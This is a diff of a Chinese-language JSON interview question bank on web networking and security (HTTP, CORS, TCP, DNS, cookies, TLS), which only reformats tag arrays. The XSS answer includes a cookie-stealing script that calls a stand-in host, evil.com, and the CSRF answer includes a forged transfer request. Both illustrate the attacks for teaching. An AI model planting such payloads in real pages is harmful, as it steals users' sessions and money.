@@ -5,12 +5,7 @@
     "difficulty": 1,
     "question": "HTTP 和 HTTPS 的区别是什么？",
     "answer": "## HTTP vs HTTPS\n\n### HTTP（HyperText Transfer Protocol）\n- 明文传输，数据不加密\n- 默认端口 80\n- 无需证书\n- 性能略高（无加密开销）\n\n### HTTPS（HTTP Secure）\n- 在 HTTP 基础上加入 TLS/SSL 加密层\n- 默认端口 443\n- 需要数字证书（CA 颁发）\n- 数据加密传输，防止窃听和篡改\n\n### HTTPS 的三大作用\n1. **加密**：防止数据被窃听（对称加密传输数据）\n2. **认证**：验证服务器身份（证书机制）\n3. **完整性**：防止数据被篡改（消息认证码）\n\n### TLS 握手过程（简化版）\n```\n1. Client Hello：客户端发送支持的 TLS 版本、加密套件、随机数\n2. Server Hello：服务器选择加密套件、发送证书、随机数\n3. 客户端验证证书合法性\n4. 密钥交换：生成会话密钥\n5. 双方使用会话密钥进行对称加密通信\n```\n\n### 为什么 HTTPS 不慢？\n- TLS 1.3 将握手从 2-RTT 减少到 1-RTT\n- 0-RTT 恢复连接\n- HTTP/2 必须使用 HTTPS，多路复用补偿了加密开销\n- 现代硬件对 AES 加密有硬件加速",
-    "tags": [
-      "HTTP",
-      "HTTPS",
-      "TLS",
-      "加密"
-    ],
+    "tags": ["HTTP", "HTTPS", "TLS", "加密"],
     "source": "高频"
   },
   {
@@ -19,11 +14,7 @@
     "difficulty": 1,
     "question": "HTTP 状态码有哪些？常见的有哪些？",
     "answer": "## HTTP 状态码\n\n### 分类\n| 范围 | 类型 | 描述 |\n|------|------|------|\n| 1xx | 信息 | 请求已接收，继续处理 |\n| 2xx | 成功 | 请求成功处理 |\n| 3xx | 重定向 | 需要进一步操作 |\n| 4xx | 客户端错误 | 请求有误 |\n| 5xx | 服务器错误 | 服务器处理失败 |\n\n### 常见状态码\n\n**2xx 成功**\n```\n200 OK           - 请求成功\n201 Created      - 资源创建成功（POST）\n204 No Content   - 请求成功但无响应体（DELETE）\n206 Partial Content - 范围请求（断点续传）\n```\n\n**3xx 重定向**\n```\n301 Moved Permanently  - 永久重定向（SEO 友好，浏览器会缓存）\n302 Found              - 临时重定向（不缓存）\n304 Not Modified       - 协商缓存命中（资源未修改）\n307 Temporary Redirect - 临时重定向（保持请求方法不变）\n308 Permanent Redirect - 永久重定向（保持请求方法不变）\n```\n\n**4xx 客户端错误**\n```\n400 Bad Request    - 请求语法错误\n401 Unauthorized   - 未认证（需要登录）\n403 Forbidden      - 无权限（已认证但权限不足）\n404 Not Found      - 资源不存在\n405 Method Not Allowed - 请求方法不允许\n409 Conflict       - 资源冲突\n413 Payload Too Large - 请求体过大\n422 Unprocessable Entity - 语义错误（参数验证失败）\n429 Too Many Requests - 请求频率过高\n```\n\n**5xx 服务器错误**\n```\n500 Internal Server Error - 服务器内部错误\n502 Bad Gateway           - 网关错误（上游服务器返回无效响应）\n503 Service Unavailable   - 服务不可用（维护或过载）\n504 Gateway Timeout       - 网关超时\n```\n\n### 301 vs 302\n- **301**：永久重定向，浏览器缓存新地址，下次直接访问新地址\n- **302**：临时重定向，每次都请求原地址再重定向",
-    "tags": [
-      "HTTP",
-      "状态码",
-      "REST"
-    ],
+    "tags": ["HTTP", "状态码", "REST"],
     "source": "高频"
   },
   {
@@ -32,12 +23,7 @@
     "difficulty": 1,
     "question": "GET 和 POST 请求有什么区别？",
     "answer": "## GET vs POST\n\n### 主要区别\n\n| | GET | POST |\n|--|-----|------|\n| 语义 | 获取资源 | 提交数据 |\n| 参数位置 | URL 查询字符串 | 请求体（body）|\n| 安全性 | 参数暴露在 URL | 相对安全 |\n| 幂等性 | 幂等（多次请求结果相同）| 非幂等 |\n| 缓存 | 可以被缓存 | 通常不缓存 |\n| 长度限制 | URL 有长度限制（~2KB）| body 无限制 |\n| 书签 | 可以收藏 | 不可以 |\n\n### 语义区别\n```\nGET  /users/1     - 获取用户\nPOST /users       - 创建用户\nPUT  /users/1     - 完整更新用户\nPATCH /users/1    - 部分更新用户\nDELETE /users/1   - 删除用户\n```\n\n### 安全性\n```\nGET 参数在 URL：\nhttps://api.example.com/login?password=123456\n→ 会出现在浏览器历史、服务器日志、Referer 头中\n\nPOST 参数在 body：\n相对安全，但 HTTPS 加密才是真正的安全保障\n```\n\n### 幂等性\n```\n幂等：f(f(x)) = f(x)，多次执行效果相同\n\nGET /users/1 - 幂等（多次获取，结果一样）\nPOST /users  - 非幂等（多次提交，可能创建多个用户）\nPUT /users/1 - 幂等（多次更新，最终状态一样）\nDELETE /users/1 - 幂等（删除后再删除，状态相同）\n```\n\n### 误区\n```\n误区：GET 请求不能有 body\n实际：HTTP 规范没有禁止，但约定上不推荐\n      部分服务器/框架会忽略 GET 的 body\n\n误区：POST 比 GET 安全\n实际：安全与否取决于是否使用 HTTPS，不取决于方法\n```",
-    "tags": [
-      "HTTP",
-      "GET",
-      "POST",
-      "RESTful"
-    ],
+    "tags": ["HTTP", "GET", "POST", "RESTful"],
     "source": "高频"
   },
   {
@@ -46,12 +32,7 @@
     "difficulty": 1,
     "question": "什么是跨域？为什么会出现跨域？如何解决？",
     "answer": "## 跨域（Cross-Origin）\n\n### 同源策略（Same-Origin Policy）\n浏览器的安全机制，限制不同源之间的资源访问。\n\n**同源条件**：协议、域名、端口三者完全相同\n```\nhttps://a.com:443/path\n协议: https\n域名: a.com\n端口: 443\n```\n\n**跨域示例**\n```\nhttps://a.com → http://a.com  （协议不同）\nhttps://a.com → https://b.com （域名不同）\nhttps://a.com → https://a.com:8080 （端口不同）\nhttps://a.com → https://sub.a.com  （子域名不同）\n```\n\n### 解决方案\n\n**1. CORS（推荐，后端配置）**\n```js\n// 服务器设置响应头\nAccess-Control-Allow-Origin: https://frontend.com\nAccess-Control-Allow-Methods: GET, POST, PUT, DELETE\nAccess-Control-Allow-Headers: Content-Type, Authorization\nAccess-Control-Allow-Credentials: true\n```\n\n**2. 开发环境代理（Vite）**\n```js\n// vite.config.js\nexport default {\n  server: {\n    proxy: {\n      '/api': {\n        target: 'http://localhost:3000',\n        changeOrigin: true,\n        rewrite: (path) => path.replace(/^\\/api/, '')\n      }\n    }\n  }\n};\n```\n\n**3. Nginx 反向代理**\n```nginx\nlocation /api/ {\n  proxy_pass http://backend:3000/;\n  proxy_set_header Host $host;\n}\n```\n\n**4. JSONP（只支持 GET，已过时）**\n```js\nfunction jsonp(url, callback) {\n  const fn = 'jsonp_' + Date.now();\n  window[fn] = callback;\n  const script = document.createElement('script');\n  script.src = `${url}?callback=${fn}`;\n  document.head.appendChild(script);\n}\n```",
-    "tags": [
-      "跨域",
-      "CORS",
-      "同源策略",
-      "代理"
-    ],
+    "tags": ["跨域", "CORS", "同源策略", "代理"],
     "source": "高频"
   },
   {
@@ -60,12 +41,7 @@
     "difficulty": 1,
     "question": "TCP 三次握手和四次挥手是什么？",
     "answer": "## TCP 三次握手和四次挥手\n\n### 三次握手（建立连接）\n```\nClient                    Server\n  |                          |\n  |----SYN(seq=x)----------->|  1. 客户端发送 SYN，进入 SYN_SENT\n  |                          |\n  |<---SYN+ACK(seq=y,ack=x+1)|  2. 服务器发送 SYN+ACK，进入 SYN_RCVD\n  |                          |\n  |----ACK(ack=y+1)--------->|  3. 客户端发送 ACK，连接建立\n  |                          |\n         连接建立完成\n```\n\n**为什么是三次？**\n- 两次握手：服务器无法确认客户端能接收数据\n- 三次握手：确保双向通信能力，防止失效连接请求造成资源浪费\n\n### 四次挥手（断开连接）\n```\nClient                    Server\n  |                          |\n  |----FIN(seq=u)----------->|  1. 客户端主动关闭，发送 FIN\n  |                          |\n  |<---ACK(ack=u+1)---------|  2. 服务器确认，客户端进入 FIN_WAIT_2\n  |                          |     服务器可能还有数据要发\n  |<---FIN(seq=w)-----------|  3. 服务器数据发完，发送 FIN\n  |                          |\n  |----ACK(ack=w+1)--------->|  4. 客户端发送 ACK，进入 TIME_WAIT\n  |                          |\n  等待 2MSL 后关闭（约 2 分钟）\n```\n\n**为什么四次挥手？**\n- TCP 是全双工的，每个方向需要独立关闭\n- 服务器收到 FIN 后可能还有数据要发送，所以 ACK 和 FIN 分开发\n\n**TIME_WAIT 的作用**\n- 确保最后一个 ACK 能到达对端\n- 让旧连接的数据包在网络中消失，避免影响新连接",
-    "tags": [
-      "TCP",
-      "三次握手",
-      "四次挥手",
-      "网络协议"
-    ],
+    "tags": ["TCP", "三次握手", "四次挥手", "网络协议"],
     "source": "高频"
   },
   {
@@ -74,12 +50,7 @@
     "difficulty": 1,
     "question": "什么是 DNS？DNS 解析过程是怎样的？",
     "answer": "## DNS（Domain Name System）\n\n### 概念\nDNS 是域名系统，将人类可读的域名（如 google.com）转换为 IP 地址（如 142.250.80.46）。\n\n### DNS 解析过程\n```\n用户输入：www.example.com\n\n1. 浏览器 DNS 缓存\n   → 命中则直接使用\n   ↓\n2. 系统 hosts 文件（/etc/hosts）\n   → 命中则直接使用\n   ↓\n3. 操作系统 DNS 缓存\n   → 命中则直接使用\n   ↓\n4. 本地 DNS 服务器（ISP 提供）\n   → 命中则直接返回\n   ↓\n5. 根域名服务器（Root DNS）\n   → 返回 .com 顶级域名服务器地址\n   ↓\n6. 顶级域名服务器（TLD，如 .com）\n   → 返回 example.com 的权威 DNS 服务器\n   ↓\n7. 权威 DNS 服务器\n   → 返回 www.example.com 的 IP 地址\n   ↓\n8. 本地 DNS 服务器缓存结果，返回给客户端\n```\n\n### DNS 记录类型\n```\nA 记录    - 域名 → IPv4 地址\nAAAA 记录 - 域名 → IPv6 地址\nCNAME 记录 - 域名 → 另一个域名（别名）\nMX 记录   - 邮件服务器\nTXT 记录  - 文本信息（验证、SPF 等）\nNS 记录   - 权威 DNS 服务器\n```\n\n### 前端优化：DNS 预解析\n```html\n<!-- 提前解析第三方域名，减少延迟 -->\n<link rel=\"dns-prefetch\" href=\"//cdn.example.com\">\n<link rel=\"dns-prefetch\" href=\"//api.example.com\">\n\n<!-- 更强力的预连接（DNS + TCP + TLS）-->\n<link rel=\"preconnect\" href=\"https://fonts.googleapis.com\">\n```\n\n### TTL（Time to Live）\n```\nDNS 记录的缓存时间，单位秒\n- 生产环境：300-3600s\n- 需要快速切换：60s（代价是 DNS 压力大）\n```",
-    "tags": [
-      "DNS",
-      "域名解析",
-      "网络",
-      "性能优化"
-    ],
+    "tags": ["DNS", "域名解析", "网络", "性能优化"],
     "source": "高频"
   },
   {
@@ -88,13 +59,7 @@
     "difficulty": 1,
     "question": "什么是 Cookie、Session 和 Token？它们的区别是什么？",
     "answer": "## Cookie、Session 和 Token\n\n### Cookie\n- **存储位置**：客户端（浏览器）\n- **大小限制**：约 4KB\n- **发送方式**：每次请求自动携带（同域）\n- **有效期**：可设置过期时间\n\n```js\n// 服务器设置\nSet-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict; Max-Age=3600\n\n// 常用属性\nHttpOnly   - 不能被 JS 读取（防 XSS）\nSecure     - 只在 HTTPS 下发送\nSameSite   - 控制跨站发送（防 CSRF）\nMax-Age    - 过期时间（秒）\nDomain     - 作用域名\n```\n\n### Session\n- **存储位置**：服务器端（内存/数据库/Redis）\n- **工作原理**：服务器生成 SessionID，通过 Cookie 传给客户端\n- **特点**：数据在服务器，安全；服务器有状态\n\n```\n1. 用户登录\n2. 服务器创建 Session，存储用户信息\n3. SessionID 通过 Cookie 发给客户端\n4. 后续请求携带 Cookie 中的 SessionID\n5. 服务器根据 SessionID 查找 Session\n```\n\n### Token（JWT）\n- **存储位置**：客户端（localStorage/sessionStorage/Cookie）\n- **工作原理**：服务器签发 Token，客户端每次请求在 Header 中携带\n- **特点**：无状态，适合分布式系统\n\n```js\n// JWT 结构：Header.Payload.Signature\n// eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOiIxMjMifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\n\n// 使用\nfetch('/api/user', {\n  headers: {\n    'Authorization': `Bearer ${token}`\n  }\n});\n```\n\n### 对比\n| | Cookie/Session | Token（JWT）|\n|--|---------------|-------------|\n| 状态 | 有状态 | 无状态 |\n| 存储 | 服务器 | 客户端 |\n| 扩展性 | 差（分布式难）| 好 |\n| 安全 | CSRF 风险 | XSS 风险 |\n| 失效 | 服务器可主动失效 | 需等到期（或黑名单）|",
-    "tags": [
-      "Cookie",
-      "Session",
-      "Token",
-      "JWT",
-      "认证"
-    ],
+    "tags": ["Cookie", "Session", "Token", "JWT", "认证"],
     "source": "高频"
   },
   {
@@ -103,12 +68,7 @@
     "difficulty": 1,
     "question": "什么是 XSS 攻击？如何防御？",
     "answer": "## XSS（Cross-Site Scripting）跨站脚本攻击\n\n### 概念\n攻击者在网页中注入恶意脚本，当其他用户访问时执行，窃取数据或执行恶意操作。\n\n### XSS 类型\n\n**1. 存储型 XSS（最危险）**\n```\n攻击者在评论中提交：<script>fetch('evil.com/?cookie='+document.cookie)</script>\n服务器将内容存入数据库\n其他用户访问页面时，脚本执行，Cookie 被盗\n```\n\n**2. 反射型 XSS**\n```\n攻击者构造恶意 URL：\nhttps://example.com/search?q=<script>alert('XSS')</script>\n服务器将参数直接输出到 HTML\n用户点击链接时执行\n```\n\n**3. DOM 型 XSS**\n```js\n// ❌ 危险：直接将 URL 参数插入 DOM\ndocument.getElementById('content').innerHTML = location.search;\n```\n\n### 防御措施\n\n**1. 输入过滤/输出转义**\n```js\n// 服务端：对 HTML 特殊字符转义\nfunction escapeHtml(str) {\n  return str\n    .replace(/&/g, '&amp;')\n    .replace(/</g, '&lt;')\n    .replace(/>/g, '&gt;')\n    .replace(/\"/g, '&quot;')\n    .replace(/'/g, '&#x27;');\n}\n```\n\n**2. CSP（Content Security Policy）**\n```html\n<!-- 只允许加载同源脚本 -->\n<meta http-equiv=\"Content-Security-Policy\"\n      content=\"script-src 'self'; object-src 'none'\">\n\n<!-- 或通过 HTTP 响应头 -->\n<!-- Content-Security-Policy: script-src 'self' 'nonce-randomValue' -->\n```\n\n**3. Cookie HttpOnly**\n```\nSet-Cookie: token=abc; HttpOnly; Secure\n→ JS 无法读取，即使 XSS 注入也无法窃取 Cookie\n```\n\n**4. React 内置保护**\n```jsx\n// React 默认转义插值内容\nconst userInput = '<script>alert(1)</script>';\n<div>{userInput}</div> // 安全，自动转义\n\n// ❌ 危险：dangerouslySetInnerHTML\n<div dangerouslySetInnerHTML={{ __html: userInput }} />\n```",
-    "tags": [
-      "XSS",
-      "安全",
-      "CSP",
-      "Cookie"
-    ],
+    "tags": ["XSS", "安全", "CSP", "Cookie"],
     "source": "高频"
   },
   {
@@ -117,12 +77,7 @@
     "difficulty": 1,
     "question": "什么是 CSRF 攻击？如何防御？",
     "answer": "## CSRF（Cross-Site Request Forgery）跨站请求伪造\n\n### 概念\n攻击者诱导用户访问恶意页面，利用用户已登录的身份（Cookie 自动携带）发起伪造请求。\n\n### 攻击流程\n```\n1. 用户登录了 bank.com，浏览器保存了 Cookie\n2. 用户被诱导访问 evil.com\n3. evil.com 中有：\n   <img src=\"https://bank.com/transfer?to=attacker&amount=1000\">\n4. 浏览器自动携带 bank.com 的 Cookie 发送请求\n5. 银行服务器收到请求，认为是合法用户操作\n```\n\n### 防御措施\n\n**1. CSRF Token（最常用）**\n```js\n// 服务器生成随机 token，放入表单或 meta 标签\n<meta name=\"csrf-token\" content=\"a1b2c3d4...\">\n\n// 请求时携带\nfetch('/api/transfer', {\n  method: 'POST',\n  headers: {\n    'X-CSRF-Token': document.querySelector('meta[name=\"csrf-token\"]').content\n  },\n  body: JSON.stringify({ amount: 100 })\n});\n\n// 服务器验证请求头中的 token 与 Session 中的一致\n```\n\n**2. SameSite Cookie**\n```\nSet-Cookie: sessionId=abc; SameSite=Strict\n\nStrict  - 完全禁止跨站发送 Cookie\nLax     - 仅允许顶级导航（点击链接）携带（默认值）\nNone    - 允许跨站（需要 Secure）\n```\n\n**3. 验证 Referer / Origin**\n```js\n// 服务器验证请求来源\napp.use((req, res, next) => {\n  const origin = req.headers.origin || req.headers.referer;\n  if (!origin || !origin.startsWith('https://mysite.com')) {\n    return res.status(403).json({ error: 'CSRF detected' });\n  }\n  next();\n});\n```\n\n**4. 双重 Cookie 提交**\n```js\n// 将 CSRF token 同时存在 Cookie 和请求参数中\n// 服务器验证两者一致\n```\n\n### CSRF vs XSS\n```\nXSS：注入恶意脚本，执行任意 JS\nCSRF：伪造用户身份发送请求（不能读取响应）\n```",
-    "tags": [
-      "CSRF",
-      "安全",
-      "SameSite",
-      "CSRF Token"
-    ],
+    "tags": ["CSRF", "安全", "SameSite", "CSRF Token"],
     "source": "高频"
   },
   {
@@ -131,12 +86,7 @@
     "difficulty": 1,
     "question": "什么是浏览器缓存？强缓存和协商缓存的流程？",
     "answer": "## 浏览器缓存机制\n\n### 缓存位置（优先级从高到低）\n```\n1. Service Worker Cache\n2. Memory Cache（内存，关闭标签页失效）\n3. Disk Cache（磁盘，持久化）\n4. Push Cache（HTTP/2 服务端推送缓存）\n```\n\n### 完整缓存流程\n```\n发起请求\n  ↓\n是否有缓存？\n  → 无 → 发网络请求 → 存储缓存 → 返回响应\n  → 有 → 检查是否过期？\n          → 未过期（强缓存命中）→ 直接返回 200(from cache)\n          → 已过期 → 发协商请求\n                    → 服务器验证未变化 → 返回 304\n                    → 服务器验证已变化 → 返回 200 + 新资源\n```\n\n### 强缓存\n```\nCache-Control: max-age=3600   # 缓存 1 小时\nExpires: Thu, 01 Jan 2025 GMT # HTTP/1.0，绝对时间\n\n→ 在有效期内，直接使用缓存，不发请求\n→ 状态码显示 200（from disk cache / from memory cache）\n```\n\n### 协商缓存\n```\n# 方案一：Last-Modified / If-Modified-Since\n响应头：Last-Modified: Wed, 21 Oct 2024 07:28:00 GMT\n请求头：If-Modified-Since: Wed, 21 Oct 2024 07:28:00 GMT\n精度：秒级\n\n# 方案二：ETag / If-None-Match（优先级更高）\n响应头：ETag: \"abc123\"\n请求头：If-None-Match: \"abc123\"\n精度：内容哈希，更精确\n\n→ 资源未变化 → 304 Not Modified（只有头，没有 body）\n→ 资源已变化 → 200 + 新资源\n```\n\n### 最佳实践\n```\nHTML：Cache-Control: no-cache\nJS/CSS（带 hash）：Cache-Control: max-age=31536000, immutable\n图片：Cache-Control: max-age=86400\nAPI：Cache-Control: no-store\n```",
-    "tags": [
-      "HTTP缓存",
-      "强缓存",
-      "协商缓存",
-      "Cache-Control"
-    ],
+    "tags": ["HTTP缓存", "强缓存", "协商缓存", "Cache-Control"],
     "source": "高频"
   },
   {
@@ -145,12 +95,7 @@
     "difficulty": 2,
     "question": "HTTP/1.1、HTTP/2、HTTP/3 的主要区别是什么？",
     "answer": "## HTTP 版本对比\n\n### HTTP/1.1 的问题\n```\n1. 队头阻塞（HOL Blocking）：同一连接请求必须串行\n2. 头部冗余：每次请求携带完整 Header\n3. 无法服务端推送：只能被动响应\n4. 文本协议：解析效率低\n```\n\n### HTTP/2 的改进\n```\n1. 多路复用：一个 TCP 连接并行处理多个请求\n2. 头部压缩（HPACK）：使用静态/动态表+哈夫曼编码\n3. 服务端推送：主动推送客户端可能需要的资源\n4. 二进制分帧：比文本协议更高效\n5. 请求优先级：可指定资源加载优先级\n```\n\n### HTTP/3 的改进（QUIC）\n```\n1. 基于 UDP 而非 TCP\n   → 彻底解决 TCP 层的队头阻塞（HTTP/2 虽然解决了应用层阻塞，但 TCP 层仍有）\n\n2. 0-RTT 连接建立\n   → TCP + TLS 需要 3-4 个 RTT\n   → QUIC 首次连接 1-RTT，再次连接 0-RTT\n\n3. 连接迁移\n   → 基于连接 ID，切换网络（WiFi → 4G）不断开连接\n   → TCP 基于四元组（IP+端口），切换后连接断开\n\n4. 内置加密\n   → QUIC 强制使用 TLS 1.3\n```\n\n### 对比表\n| 特性 | HTTP/1.1 | HTTP/2 | HTTP/3 |\n|------|----------|--------|--------|\n| 协议 | TCP | TCP | UDP（QUIC）|\n| 多路复用 | ❌ | ✅ | ✅ |\n| 头部压缩 | ❌ | HPACK | QPACK |\n| 服务端推送 | ❌ | ✅ | ✅ |\n| 0-RTT | ❌ | ❌ | ✅ |\n| 队头阻塞 | 有 | 应用层解决 | 彻底解决 |\n| 加密 | 可选 | 实践中必须 | 强制 |\n\n### 浏览器支持\n```\nHTTP/2：Chrome、Firefox、Safari 均支持（需 HTTPS）\nHTTP/3：Chrome 87+、Firefox 88+、Safari 14+\n```",
-    "tags": [
-      "HTTP/2",
-      "HTTP/3",
-      "QUIC",
-      "多路复用"
-    ],
+    "tags": ["HTTP/2", "HTTP/3", "QUIC", "多路复用"],
     "source": "高频"
   },
   {
@@ -159,12 +104,7 @@
     "difficulty": 2,
     "question": "CORS 的工作原理是什么？什么是预检请求？",
     "answer": "## CORS 工作原理\n\n### 请求分类\n\n**简单请求**（不触发预检）\n```\n条件：\n- 方法是 GET、HEAD、POST 之一\n- 请求头只有：Accept、Accept-Language、Content-Language、Content-Type\n- Content-Type 只能是：text/plain、multipart/form-data、application/x-www-form-urlencoded\n```\n\n```js\n// 简单请求：直接发送，服务器通过响应头控制\nfetch('https://api.example.com/data');\n\n// 服务器响应\nAccess-Control-Allow-Origin: https://frontend.com\n```\n\n**预检请求（Preflight）**\n```\n触发条件（不满足简单请求条件）：\n- 使用了 PUT/DELETE/PATCH 等方法\n- 添加了自定义头（如 Authorization）\n- Content-Type 为 application/json\n```\n\n```\n流程：\n1. 浏览器先发 OPTIONS 请求（预检）\n   OPTIONS /api/users HTTP/1.1\n   Origin: https://frontend.com\n   Access-Control-Request-Method: POST\n   Access-Control-Request-Headers: Content-Type, Authorization\n\n2. 服务器响应（允许则返回）\n   Access-Control-Allow-Origin: https://frontend.com\n   Access-Control-Allow-Methods: GET, POST, PUT, DELETE\n   Access-Control-Allow-Headers: Content-Type, Authorization\n   Access-Control-Max-Age: 86400  // 预检缓存时间\n\n3. 浏览器发送实际请求\n```\n\n### 携带凭证（Cookie）\n```js\n// 前端设置\nfetch('https://api.example.com/user', {\n  credentials: 'include'\n});\n\n// 服务器响应头\nAccess-Control-Allow-Origin: https://frontend.com  // 不能是 *\nAccess-Control-Allow-Credentials: true\n```\n\n### Node.js 配置 CORS\n```js\n// 使用 cors 中间件\nimport cors from 'cors';\n\napp.use(cors({\n  origin: ['https://frontend.com', 'http://localhost:3000'],\n  methods: ['GET', 'POST', 'PUT', 'DELETE'],\n  allowedHeaders: ['Content-Type', 'Authorization'],\n  credentials: true,\n  maxAge: 86400\n}));\n```",
-    "tags": [
-      "CORS",
-      "跨域",
-      "预检请求",
-      "OPTIONS"
-    ],
+    "tags": ["CORS", "跨域", "预检请求", "OPTIONS"],
     "source": "高频"
   },
   {
@@ -173,12 +113,7 @@
     "difficulty": 2,
     "question": "什么是 WebSocket？它与 HTTP 有什么区别？",
     "answer": "## WebSocket\n\n### 概念\nWebSocket 是基于 TCP 的全双工通信协议，允许服务器主动向客户端推送数据，解决了 HTTP 的请求-响应模式限制。\n\n### 与 HTTP 的区别\n| | HTTP | WebSocket |\n|--|------|----------|\n| 通信方式 | 半双工（请求-响应）| 全双工 |\n| 连接 | 短连接（HTTP/1.1 默认持久）| 长连接 |\n| 服务端推送 | 不支持 | 支持 |\n| 开销 | 每次请求带完整 Header | 建立后帧很小 |\n| 协议 | http/https | ws/wss |\n| 场景 | 页面请求 | 实时通信 |\n\n### WebSocket 握手\n```\n1. 客户端发送 HTTP 升级请求：\n   GET /chat HTTP/1.1\n   Upgrade: websocket\n   Connection: Upgrade\n   Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\n   Sec-WebSocket-Version: 13\n\n2. 服务器响应 101 Switching Protocols：\n   HTTP/1.1 101 Switching Protocols\n   Upgrade: websocket\n   Connection: Upgrade\n   Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=\n\n3. 握手完成，双方使用 WebSocket 协议通信\n```\n\n### 前端使用\n```js\nconst ws = new WebSocket('wss://chat.example.com');\n\n// 连接建立\nws.onopen = () => {\n  console.log('连接成功');\n  ws.send(JSON.stringify({ type: 'join', room: 'general' }));\n};\n\n// 接收消息\nws.onmessage = (event) => {\n  const data = JSON.parse(event.data);\n  console.log('收到消息:', data);\n};\n\n// 连接关闭\nws.onclose = (event) => {\n  console.log('连接关闭:', event.code, event.reason);\n};\n\n// 错误处理\nws.onerror = (error) => {\n  console.error('WebSocket 错误:', error);\n};\n\n// 关闭连接\nws.close(1000, 'User left');\n```\n\n### 适用场景\n- 实时聊天、在线客服\n- 实时协作（在线文档、白板）\n- 股票/加密货币实时行情\n- 在线游戏\n- 实时通知",
-    "tags": [
-      "WebSocket",
-      "实时通信",
-      "全双工",
-      "HTTP"
-    ],
+    "tags": ["WebSocket", "实时通信", "全双工", "HTTP"],
     "source": "高频"
   },
   {
@@ -187,12 +122,7 @@
     "difficulty": 2,
     "question": "什么是 SSE（Server-Sent Events）？与 WebSocket 有何区别？",
     "answer": "## SSE（Server-Sent Events）\n\n### 概念\nSSE 是基于 HTTP 的**单向**（服务器→客户端）实时推送技术，使用 `text/event-stream` 类型保持长连接。\n\n### 基本用法\n```js\n// 客户端\nconst eventSource = new EventSource('/api/stream');\n\n// 接收消息\neventSource.onmessage = (event) => {\n  console.log('收到:', event.data);\n};\n\n// 监听特定事件类型\neventSource.addEventListener('news', (event) => {\n  console.log('新闻:', event.data);\n});\n\n// 关闭连接\neventSource.close();\n\n// 携带凭证\nconst es = new EventSource('/api/stream', { withCredentials: true });\n```\n\n```js\n// 服务端（Node.js）\napp.get('/api/stream', (req, res) => {\n  res.setHeader('Content-Type', 'text/event-stream');\n  res.setHeader('Cache-Control', 'no-cache');\n  res.setHeader('Connection', 'keep-alive');\n\n  // 发送数据格式：data: xxx\\n\\n\n  const sendEvent = (data, eventType = 'message') => {\n    res.write(`event: ${eventType}\\n`);\n    res.write(`data: ${JSON.stringify(data)}\\n\\n`);\n  };\n\n  const interval = setInterval(() => {\n    sendEvent({ time: Date.now(), temp: Math.random() * 30 });\n  }, 1000);\n\n  req.on('close', () => {\n    clearInterval(interval);\n  });\n});\n```\n\n### SSE 格式\n```\ndata: Hello World\\n\\n          简单文本\n\nid: 1\\n                         消息 ID（断线重连用）\nevent: news\\n                   自定义事件名\ndata: {\"title\": \"Latest\"}\\n\\n\n\nretry: 3000\\n\\n                  重连时间（ms）\n```\n\n### SSE vs WebSocket\n| | SSE | WebSocket |\n|--|-----|----------|\n| 方向 | 单向（服务器→客户端）| 双向 |\n| 协议 | HTTP | WS |\n| 重连 | 自动重连 | 需手动实现 |\n| 浏览器支持 | 广泛（IE不支持）| 广泛 |\n| 复杂度 | 简单 | 较复杂 |\n| 场景 | 新闻流、AI 对话流 | 聊天、游戏 |\n\n### AI 流式输出（ChatGPT 模式）\n```js\nconst eventSource = new EventSource('/api/chat?message=hello');\neventSource.onmessage = (e) => {\n  if (e.data === '[DONE]') { eventSource.close(); return; }\n  appendToMessage(e.data); // 逐字显示\n};\n```",
-    "tags": [
-      "SSE",
-      "Server-Sent Events",
-      "实时通信",
-      "WebSocket"
-    ],
+    "tags": ["SSE", "Server-Sent Events", "实时通信", "WebSocket"],
     "source": "高频"
   },
   {
@@ -201,13 +131,7 @@
     "difficulty": 2,
     "question": "什么是 TLS/SSL 握手过程？",
     "answer": "## TLS 握手过程\n\n### TLS 1.2 握手（2-RTT）\n```\nClient                              Server\n  |                                   |\n  |--ClientHello (支持的TLS版本,       |\n  |   加密套件列表, 随机数C)----------->|\n  |                                   |\n  |<--ServerHello (选定TLS版本,        |\n  |    选定加密套件, 随机数S)           |\n  |<--Certificate (服务器证书)         |\n  |<--ServerKeyExchange (可选)         |\n  |<--ServerHelloDone-----------------|\n  |                                   |\n  |   验证证书（向CA验证）              |\n  |                                   |\n  |--ClientKeyExchange (加密的预主密钥)->|\n  |--ChangeCipherSpec---------------->|\n  |--Finished (加密的握手摘要)-------->|\n  |                                   |\n  |<--ChangeCipherSpec                |\n  |<--Finished (加密的握手摘要)--------|\n  |                                   |\n  |====== 开始加密通信 ===============|\n```\n\n### TLS 1.3 握手（1-RTT）\n```\nClient                              Server\n  |                                   |\n  |--ClientHello (版本, 密钥共享,       |\n  |   加密套件)----------------------->|\n  |                                   |\n  |<--ServerHello (密钥共享)           |\n  |<--EncryptedExtensions             |\n  |<--Certificate                     |\n  |<--CertificateVerify               |\n  |<--Finished--------------------    |\n  |                                   |\n  |--Finished------------------------>|\n  |                                   |\n  |====== 开始加密通信 ===============|\n```\n\n### 密钥协商\n```\n使用 ECDHE（椭圆曲线 Diffie-Hellman）密钥交换：\n1. 客户端生成临时密钥对（PrivC, PubC）\n2. 服务器生成临时密钥对（PrivS, PubS）\n3. 双方交换公钥\n4. 各自计算相同的会话密钥：\n   PMS = ECDH(PrivC, PubS) = ECDH(PrivS, PubC)\n5. 用 PMS + 随机数C + 随机数S 派生会话密钥\n\n优点：即使私钥泄露，过去的通信也无法解密（前向保密）\n```\n\n### 证书验证\n```\n1. 浏览器收到服务器证书\n2. 查看证书的签发机构（Issuer）\n3. 在系统/浏览器的根证书列表中找到 CA 的根证书\n4. 用 CA 的公钥验证证书签名\n5. 检查证书有效期、域名是否匹配、是否被吊销（OCSP）\n```",
-    "tags": [
-      "TLS",
-      "SSL",
-      "HTTPS",
-      "加密",
-      "握手"
-    ],
+    "tags": ["TLS", "SSL", "HTTPS", "加密", "握手"],
     "source": "高频"
   },
   {
@@ -216,12 +140,7 @@
     "difficulty": 2,
     "question": "什么是长轮询（Long Polling）？与普通轮询和 WebSocket 有何区别？",
